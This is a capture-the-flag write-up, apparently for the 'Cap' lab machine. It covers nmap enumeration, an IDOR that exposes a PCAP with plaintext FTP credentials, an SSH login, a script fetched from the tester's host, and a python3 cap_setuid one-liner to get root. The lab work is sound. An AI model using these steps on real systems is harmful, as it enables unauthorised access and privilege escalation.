###
Improper controls result in Insecure Direct Object Reference (IDOR) giving access to another user's capture. IDOR
The capture contains plaintext credentials and can be used to gain foothold. FTP 
A Linux capability is then leveraged to escalate to root. GTFOBINS CAP Python3
###


1-Enumeration:
    └─$ nmap -T5 -sV -sC -Pn 10.129.12.223 -v
        21/tcp open  ftp     vsftpd 3.0.3
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
        |   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
        |_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
        80/tcp open  http    Gunicorn
        |_http-server-header: gunicorn
        | http-methods: 
        |_  Supported Methods: OPTIONS GET HEAD
        |_http-title: Security Dashboard
        Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

    Port 80:
        there is another IP to scan: 10.10.14.44 
            PORT    STATE SERVICE VERSION
            22/tcp  open  ssh     OpenSSH 10.0p2 Debian 7+deb13u1 (protocol 2.0)
            111/tcp open  rpcbind 2-4 (RPC #100000)
            | rpcinfo: 
            |   program version    port/proto  service
            |   100000  2,3,4        111/tcp   rpcbind
            |   100000  2,3,4        111/udp   rpcbind
            |   100000  3,4          111/tcp6  rpcbind
            |_  100000  3,4          111/udp6  rpcbind
            Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

            RPC open 

        on this url path: http://10.129.12.223/netstat

        We found their is two user ids:
            1001
            101

        URL: http://10.129.12.223/data/0 via intruder and by changing the numbers we found a PCAP with datas

        We found on the PCAP FTP User Auth in clear Text:
            nathan - Buck3tH4TF0RM3!

    Port 22:
        We are able to SSH with the creds:
             [★]$ ssh nathan@10.129.12.223

        to gain time we can Enum via LinEnum.sh 

2-Enumeration:
    nathan@cap:/tmp$ curl http://10.10.14.23:4443/LinEnum.sh 

    Linux priv esc cmd + Methodologye:
        https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

    NOthing works except capabilities:
        nathan@cap:~$ getcap -r  /usr/bin
            /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
            /usr/bin/ping = cap_net_raw+ep
            /usr/bin/traceroute6.iputils = cap_net_raw+ep
            /usr/bin/mtr-packet = cap_net_raw+ep

        Lets try to exploit python via gtfobins for priv esc:
            https://gtfobins.org/gtfobins/python/


3-Priv Esc:
    on GTFOBins we use the executable "capabilities" on the ssh to spawn creds:
        nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'
            # id
            uid=0(root) gid=1001(nathan) groups=1001(nathan)
            # whoami
            root

    We are root



